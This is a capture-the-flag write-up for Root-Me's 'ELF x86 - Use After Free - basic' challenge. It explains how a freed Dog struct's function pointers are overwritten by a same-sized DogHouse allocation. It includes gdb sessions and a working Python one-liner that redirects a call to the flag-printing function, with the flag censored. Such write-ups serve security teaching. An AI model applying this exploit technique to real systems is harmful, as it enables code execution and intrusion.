# ELF x86 - Use After Free - basic
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Use-After-Free-basic
```
Environment configuration :
PIE 	Position Independent Executable 	No
RelRO 	Read Only relocations 	             	Yes
NX 	Non-Executable Stack 	                Yes
Heap exec 	Non-Executable Heap 	        Yes
ASLR 	Address Space Layout Randomization 	Yes  
SRC 	Source code access 	                Yes

Challenge connection informations :

Host	        challenge03.root-me.org
Protocol	SSH
Port	        2223
SSH access 	ssh -p 2223 app-systeme-ch63@challenge03.root-me.org    
Username	app-systeme-ch63
Password	app-systeme-ch63
```

The challenge provides a source code, and the title pretty much implies the vulnerability. Let's find it.
```c
struct Dog {
    char name[12];
    void (*bark)();				// <---- a function which does nothing
    void (*bringBackTheFlag)();			// <---- a function which prints the flag
    void (*death)(struct Dog*);			// <---- a function which frees the dog struct
};
struct DogHouse{
    char address[16];
    char name[8];
};

int main(){
	struct Dog* dog = NULL;
    struct DogHouse* dogHouse = NULL;
    [...snip...]
		case '4':
		if(!dog){
				puts("You do not have a dog.");
				break;
		}
		dog->death(dog);					// <---- frees the Dog struct and still keeps the pointer
		break;
	[...snip...]
}
```
As the above code (and comments) describes, there is a UAF vulnerability in this program. It's possible to allocate a Dog struct, and then free it. Afterward, it's possible to allocate a DogHouse in the same memory location of the free'd Dog struct, which will overwrite the Dog's functions.

First let's verify the vulnerability.

So, the plan is:<br>
	1. Buy a dog (allocate a Dog struct).
	2. Kill the dog (free the Dog struct).
	3. Buy a dog house (allocate a DogHouse sturct) which will overwrite a function pointer of the killed dog.
	4. The dog's spirit is still with us, so call its overwrite function (the is no changing of the Dog struct pointer, so it's possible).
	5. Get the flag.
(Note: I love animals and against animal cruelty).

Let's verify the vulnerability and see what's up:
```gdb
(gdb) run
Starting program: /challenge/app-systeme/ch63/ch63
warning: the debug information found in "/lib/old32/libc-2.19.so" does not match "/lib/old32/libc.so.6" (CRC mismatch).

1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
1
How do you name him?
Albert
You buy a new dog. Albert is a good name for him
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
4
Albert run under a car... Albert 0-1 car
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
5
Where do you build it?
AAAABBBBCCCCDDDD
How do you name it?
EEEEFFFF
You build a new dog house.
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
2

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```
The following diagram will describe what happend:
```
    1. Allocating a Dog sturct
      +---------------------+--------+--------------------+-------+
      |         Albert      | bark() | bringBackTheFlag() | death |   (24 bytes)
      +---------------------+--------+----------------------------+

    2. Freeing the Dog struct - no change.
    3. Allocating a DogHouse struct in the same memory address (same size).
      +---------------------+--------+--------------------+-------+
      |     AAAABBBBCCCC    |  DDDD  |        EEEE        | FFFF  |   (24 bytes)
      +---------------------+--------+----------------------------+
    4. Running bark() results in segmantation fault.
```
At this point we've got a code execution. Now it's time to leaverage it.<br>
The ASLR is on, but the PIE is off, which means that the _text segment is not
randomized. In addition, according to the source code, the challenge made it
easy for us and added a function which prints the flag - so we won't have to build
a ROP and cat the file.

According to gdb, the function is at 0x80487cb:
```gdb
(gdb) print bringBackTheFlag
$1 = {<text variable, no debug info>} 0x80487cb <bringBackTheFlag>
```

So after combining all of the above, we've got the following output:
```sh
$ python -c "print '1\n' + 'albert\n' + '4\n' + '5\n' + 'AAAABBBBCCCC\xcb\x87\x04\x08\n' + 'EEEEFFFF\n' + '2\n'" | ./ch63
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
How do you name him?
You buy a new dog. Albert is a good name for him
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
Albert run under a car... Albert 0-1 car
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
Where do you build it?
How do you name it?
You build a new dog house.
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
<censored>
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
```
